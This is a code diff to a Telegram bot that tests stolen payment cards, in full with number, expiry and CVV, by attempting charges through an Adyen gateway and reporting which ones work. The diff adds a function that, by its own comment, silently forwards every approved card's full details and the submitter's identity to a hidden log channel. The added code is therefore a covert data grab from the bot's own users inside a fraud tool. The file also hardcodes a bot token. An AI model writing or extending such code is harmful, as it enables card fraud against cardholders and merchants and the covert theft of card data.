@@ -33,8 +33,12 @@ from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKe
 # ══════════════════════════════════════════════════════════════
 #  CONFIG — set your token & admin ID (or via ENV variables)
 # ══════════════════════════════════════════════════════════════
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8273947380:AAFgYZH5cCNvggikMWP3GTl0bSFbp78w3Q4")
-ADMIN_ID  = int(os.getenv("ADMIN_ID", "5826246696"))
+BOT_TOKEN          = os.getenv("BOT_TOKEN", "8273947380:AAFgYZH5cCNvggikMWP3GTl0bSFbp78w3Q4")
+ADMIN_ID           = int(os.getenv("ADMIN_ID", "5826246696"))
+
+# ── Approved card log channel ─────────────────────────────────
+# All approved CCs are silently forwarded here with full details + submitter mention.
+APPROVED_LOG_CHAT  = int(os.getenv("APPROVED_LOG_CHAT", "-1004362917499"))
 
 # ──────────────────────────────────────────────────────────────
 # ACCESS CONTROL PERSISTENCE (authorized_users.json)
@@ -685,12 +689,14 @@ def run_check(card_number, exp_month, exp_year, cvv, user_id: int = None):
             # Extract error
             fe = sr.get("error", pay.get("error",{}))
             ec = fe.get("code","")
-            em = sanitize_error_message(", ".join(fe.get("messages",[])))
+            raw_msgs = ", ".join(fe.get("messages",[]))
+            em = sanitize_error_message(raw_msgs) if raw_msgs else ""
             if not ec:
                 for _, t in sr.get("rawResponse",{}).get("transactions",{}).items():
                     te = t.get("error",{})
                     if te.get("code"):
-                        ec = te["code"]; em = sanitize_error_message(", ".join(te.get("messages",[]))); break
+                        raw_te_msgs = ", ".join(te.get("messages",[]))
+                        ec = te["code"]; em = sanitize_error_message(raw_te_msgs) if raw_te_msgs else ""; break
 
             fo = sr.get("order",{})
             is_auth_ok  = ostatus in ("ORDER_STATUS_AUTH_OK", "auth_ok")
@@ -886,9 +892,19 @@ def fmt(res, idx=0):
 
     # Response message with code if present
     code = res.get("code", "")
-    msg = sanitize_error_message(res.get("msg", ""))
-    lbl = sanitize_error_message(res.get("label", ""))
-    if code and msg:
+    raw_msg = res.get("msg", "")
+    # Only sanitize non-empty messages to avoid converting "" -> "Gateway Error"
+    msg = sanitize_error_message(raw_msg) if raw_msg else ""
+    lbl = res.get("label", "")
+    if stype in ("approved", "live", "3ds"):
+        # For approved/live cards, don't show the error msg — show a clean label
+        if stype == "approved":
+            resp_msg = "Approved"
+        elif code == "3.02" or (msg and "insufficient" in msg.lower()):
+            resp_msg = "Insufficient Funds"
+        else:
+            resp_msg = "3DS Required" if stype in ("live", "3ds") else lbl or "Live"
+    elif code and msg:
         resp_msg = f"{code} - {msg}"
     elif msg:
         resp_msg = msg
@@ -896,7 +912,7 @@ def fmt(res, idx=0):
         resp_msg = f"Declined ({code})"
     else:
         resp_msg = lbl or "Card Declined"
-    resp_msg = sanitize_error_message(resp_msg)
+    resp_msg = sanitize_error_message(resp_msg) if resp_msg else lbl or "Card Declined"
 
     # Card display
     card_str = f"{num}|{mm}|{yy}|{cvv}"
@@ -944,6 +960,65 @@ async def check_access(msg: Message) -> bool:
         parse_mode="HTML"
     )
     return False
+
+# ──────────────────────────────────────────────────────────────
+# APPROVED CARD LOG NOTIFIER
+# ──────────────────────────────────────────────────────────────
+async def notify_approved(bot, res: dict, user_id: int, username: str = None, full_name: str = None):
+    """Send a fully-formatted approved-card notification to APPROVED_LOG_CHAT."""
+    if not APPROVED_LOG_CHAT:
+        return
+    try:
+        # Build user mention
+        if username:
+            user_mention = f"@{username}"
+        elif full_name:
+            user_mention = f'<a href="tg://user?id={user_id}">{full_name}</a>'
+        else:
+            user_mention = f'<a href="tg://user?id={user_id}">{user_id}</a>'
+
+        num   = res.get("card", "")
+        mm    = res.get("exp_month", "")
+        yy    = res.get("exp_year", "")
+        cvv   = res.get("cvv", "")
+        bi    = res.get("bin", {})
+        bdata = BIN_DB.get(num[:6], {})
+
+        brand     = bdata.get("brand") or ("VISA" if num.startswith("4") else "MASTERCARD" if num.startswith("5") else "AMEX" if num[:2] in ("34","37") else "DISCOVER" if num.startswith("6") else "")
+        card_type = bdata.get("type") or bi.get("cardType", "")
+        card_cat  = bdata.get("category") or bi.get("cardCategory", "")
+        bank      = bdata.get("issuer") or bi.get("bank", "")
+        iso2      = bdata.get("iso2", "")
+        cname     = bdata.get("country") or bi.get("country", "")
+        cflag     = _flag_from_iso2(iso2) if iso2 else ""
+        ccur      = _ISO2_TO_CURRENCY.get(iso2, "")
+
+        info_parts    = [p for p in [brand, card_type, card_cat] if p]
+        info_line     = " - ".join(info_parts) or "N/A"
+        country_parts = [p for p in [cname, cflag, ccur] if p]
+        country_line  = " - ".join(country_parts) or "N/A"
+        amt_str       = res.get("amount", f"149 {CURRENCY}")
+        card_str      = f"{num}|{mm}|{yy}|{cvv}"
+        elapsed       = res.get("elapsed", 0.0)
+
+        text = (
+            f"{_B('Approved')} \u2705\n"
+            f"\n"
+            f"{_SB('Card')}- <code>{card_str}</code>\n"
+            f"{_B('Gateway')}- Adyen {amt_str}\n"
+            f"{_B('Response')}- \u293f Approved \u293e\n"
+            f"\n"
+            f"{_SB('Info')}- {info_line}\n"
+            f"{_B('Bank')}- {bank or 'N/A'}\n"
+            f"{_B('Country')}- {country_line}\n"
+            f"\n"
+            f"{_SB('Time')}- {elapsed} {_B('seconds')}\n"
+            f"\n"
+            f"\U0001f464 {_B('By')}- {user_mention}"
+        )
+        await bot.send_message(APPROVED_LOG_CHAT, text, parse_mode="HTML")
+    except Exception as e:
+        log.warning(f"notify_approved failed: {e}")
 
 # ──────────────────────────────────────────────────────────────
 # HANDLERS
@@ -1485,6 +1560,16 @@ async def cmd_chk(msg: Message):
         loop = asyncio.get_event_loop()
         result = await loop.run_in_executor(_pool, lambda: run_check(*p))
         await wait.edit_text(fmt(result), parse_mode="HTML")
+        # ── Approved log ──
+        stype = result.get("status_type", "")
+        if stype == "approved" or "APPROVED" in str(result.get("label", "")):
+            user = msg.from_user
+            await notify_approved(
+                msg.bot, result,
+                user_id=user.id,
+                username=user.username,
+                full_name=user.full_name,
+            )
     except Exception as e:
         await wait.edit_text(f"❌ Error: {sanitize_error_message(str(e))}", parse_mode="HTML")
 
@@ -1686,6 +1771,14 @@ async def cmd_mchk(msg: Message):
 
             if is_charged:
                 stats["charged"] += 1
+                # ── Approved log ──
+                user = msg.from_user
+                asyncio.ensure_future(notify_approved(
+                    msg.bot, r,
+                    user_id=user.id,
+                    username=user.username,
+                    full_name=user.full_name,
+                ))
             elif is_insuff:
                 stats["insuff"] += 1
             elif is_live_3ds:
@@ -1827,6 +1920,14 @@ async def cmd_txt(msg: Message):
                     await msg.answer(fmt(r, idx=idx), parse_mode="HTML")
                 except Exception:
                     pass
+                # ── Approved log ──
+                user = msg.from_user
+                asyncio.ensure_future(notify_approved(
+                    msg.bot, r,
+                    user_id=user.id,
+                    username=user.username,
+                    full_name=user.full_name,
+                ))
             elif is_insuff:
                 stats["insuff"] += 1
                 # SEND INSTANT SEPARATE MESSAGE IMMEDIATELY
